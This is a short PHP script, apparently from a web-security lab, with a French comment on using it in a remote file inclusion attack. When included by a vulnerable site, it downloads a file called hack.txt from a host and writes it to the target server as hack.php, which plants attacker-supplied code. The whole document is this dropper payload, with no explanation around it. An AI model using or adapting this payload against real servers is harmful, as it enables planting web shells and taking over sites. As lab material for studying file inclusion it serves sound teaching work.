<?php
	// Enlever les commentaires dans le cas de l'inclusion d'un fichier distant
	/* echo '<?php */
		echo "<center>trying to copy</center>";
		copy("http://127.0.0.1/web_security/hacker_script/hack.txt","hack.php");
		echo "<center>job finished</center>";
	/* ?>'; */
?>